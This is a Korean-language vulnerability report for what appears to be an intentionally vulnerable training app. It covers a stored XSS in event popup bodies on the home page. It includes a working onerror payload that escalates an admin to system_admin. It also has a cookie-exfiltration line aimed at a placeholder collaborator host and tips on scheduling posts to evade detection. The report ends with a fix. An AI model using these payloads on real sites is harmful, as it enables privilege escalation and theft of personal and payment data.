# VULN-023 이벤트 팝업 본문 저장형 XSS (메인 페이지 전역 렌더)

- 대상 스택: node-express, java-spring, client
- 심각도: High
- 분류: A05:2025 Injection (Stored XSS, CWE-79)

## 위치

- `apps/node-express/src/routes/events.js` `POST /api/events` / `PUT /api/events/:id` —
  `body` 필드를 정제·이스케이프 없이 `events.body` 에 저장.
- `apps/java-spring/.../controller/EventController.java` — 동일. `Event.body` 를 그대로 저장.
- `apps/client/src/components/EventPopups.jsx` — `GET /api/events` 로 받은 각 이벤트의
  `body` 를 `dangerouslySetInnerHTML={{ __html: event.body }}` 로 렌더. 이 팝업은
  **메인 페이지(`/`) 로딩 시 모든 방문자에게** 표시된다.

이벤트 작성은 `requireAdmin`(= `admin` 또는 `system_admin`) 으로 제한된다. 그러나 `admin`
등급은 상품/문의 관리를 위해 폭넓게 부여되는 역할이고, `system_admin` 으로의 권한 변경 권한은
없다(VULN-013 와 대비). 저장된 페이로드는 홈을 여는 **모든** 세션에서 실행되므로,
`admin` 계정 하나가 `system_admin` 을 포함한 임의 방문자의 세션을 탈취/조작할 수 있다.

## 트리거 방법

`admin` 세션으로:

```
POST /api/{node,java}/events
{"title":"깜짝 이벤트","body":"<img src=x onerror=\"fetch('/api/node/admin/users/2/role',{method:'PUT',headers:{'Content-Type':'application/json'},credentials:'include',body:JSON.stringify({role:'system_admin'})})\">","active":true}
```

이후 `system_admin`(`9u4a`) 이 홈(`/`) 을 열면 팝업 렌더 시 페이로드가 그의 세션으로
실행되어 `admin`(user id 2) 을 `system_admin` 으로 승격한다.

- 쿠키 탈취: `<script>new Image().src='https://<collab>/'+document.cookie</script>`
  — 단 세션 쿠키는 `HttpOnly` 이므로 `document.cookie` 로는 안 나온다. 대신 세션을 탄
  요청(`fetch('/api/*/profile')` 등)으로 PII·주문 `tossPaymentKey` 유출.
- `startsAt`/`endsAt` 로 예약 게시도 가능(탐지 회피에 악용 가능).

## 영향

- 인증된 `admin` → 홈 방문 전원 대상 세션 라이딩. `system_admin` 승격(권한 경계 돌파),
  타 사용자 PII/결제정보 유출, 피싱 콘텐츠 삽입.
- 팝업이 첫 화면에 뜨므로 사용자 상호작용 없이 실행.

## 증거 (재현 확인)

(진단 단계에서 채움) `admin` 세션으로 role-change 페이로드를 담은 이벤트 등록 →
`9u4a` 로 `/` 접속 → `GET /api/*/admin/users` 에서 `admin` 의 role 이 `system_admin` 으로 바뀜.

## 조치 상태: 미조치 (의도된 취약점)

정상 구현: 이벤트 본문을 신뢰할 수 없는 입력으로 취급 — 서버에서 HTML 새니타이즈
(허용 태그 화이트리스트) 하거나 클라이언트에서 `dangerouslySetInnerHTML` 대신 텍스트 렌더 +
제한된 마크다운. 관리 콘솔 입력이라도 저장형 XSS 경계는 유지해야 한다.
